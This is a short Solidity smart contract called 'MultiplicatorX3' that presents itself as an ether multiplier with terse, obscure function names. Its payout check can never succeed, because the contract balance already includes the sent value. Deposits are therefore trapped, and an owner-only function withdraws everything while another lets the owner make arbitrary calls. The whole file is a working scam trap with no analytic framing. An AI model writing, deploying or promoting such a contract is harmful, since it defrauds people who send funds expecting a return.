pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public O = msg.sender;
   
    function() public payable{}
   
    function w()
    payable
    public
    {
        require(msg.sender == O);
        O.transfer(this.balance);
    }
    
    function C(address a, bytes d)
    payable
    public
    {
        require(msg.sender == O);
         
        a.call.value(msg.value)(d);
    }
    
    function m(address a)
    public
    payable
    {
        r(a);
    }

    function r(address a) internal {
        if(msg.value >= this.balance)
        {        
            a.transfer(this.balance + msg.value);
        }
    }
}